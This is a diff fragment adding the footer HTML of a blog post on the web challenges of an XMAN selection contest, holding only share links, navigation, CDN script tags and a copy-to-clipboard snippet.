+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&is_video=false&description=xman选拔赛web部分"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xman选拔赛web部分&body=Check out this article: http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&name=xman选拔赛web部分&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&t=xman选拔赛web部分"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
